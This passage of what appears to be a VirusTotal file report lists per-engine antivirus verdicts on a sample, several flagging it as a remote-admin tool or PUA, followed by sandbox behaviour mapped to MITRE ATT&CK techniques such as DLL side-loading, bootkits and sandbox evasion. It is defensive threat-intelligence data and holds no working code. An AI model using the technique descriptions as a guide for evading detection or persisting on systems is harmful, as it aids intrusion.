          "engine_version": "2.0.0.5041",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50865",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Alibaba": {
          "category": "undetected",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.138.50866",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CrowdStrike": {
          "category": "undetected",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231026"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.627",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Elastic": {
          "category": "undetected",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28638",
          "result": "a variant of Win32/RemoteAdmin.RemoteUtilities.Z potentially unsafe",
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "APEX": {
          "category": "undetected",
          "engine_name": "APEX",
          "engine_version": "6.493",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "not-a-virus:RemoteAdmin.Win32.RemoteUtilities.mo",
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Generic Reputation PUA (PUA)",
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240126-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "GrayWare/Win32.Remote.a",
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.156.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36381",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "not-a-virus:RemoteAdmin.Win32.RemoteUtilities.mo",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.37241B:27.34708",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W32/ABRisk.COFE-2672",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-27.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Hacktool.RemoteUtilities!8.49C (CLOUD)",
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "DeepInstinct": {
          "category": "undetected",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240122"
        }
      },
      "reputation": -7,
      "first_seen_itw_date": 1698229300,
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 2,
        "critical": 0,
        "low": 0
      }
    },
    "type": "file",
    "id": "760e2fd3e57186b597d40b996811768e6c4a28ca54685e029104fcf82f68238d",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/760e2fd3e57186b597d40b996811768e6c4a28ca54685e029104fcf82f68238d"
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/001/",
                "id": "T1071.001",
                "name": "Web Protocols"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Public key (encryption) found"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1560/",
                "id": "T1560",
                "name": "Archive Collected Data"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              },
              {
                "description": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May use bcdedit to modify the Windows boot settings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1542/003/",
                "id": "T1542.003",
                "name": "Bootkit"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample may offer command line options, please run it with the command line option cookbook (it's possible that the command line switches require additional characters like)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sample might require command line arguments, analyze it with the command line cookbook"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the installation date of Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the product ID of Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. \nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.\nOn network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Potential time zone aware malware"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1124/",
                "id": "T1124",
                "name": "System Time Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Query firmware table information (likely to detect VMs)"
                  },
                  {
                    "severity": "INFO",
                    "description": "AV process strings found (often used to terminate AV products)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to detect sandboxes and other dynamic analysis tools"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Query firmware table information (likely to detect VMs)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Query firmware table information (likely to detect VMs)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              },
              {
                "description": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May use bcdedit to modify the Windows boot settings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1542/003/",
                "id": "T1542.003",
                "name": "Bootkit"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
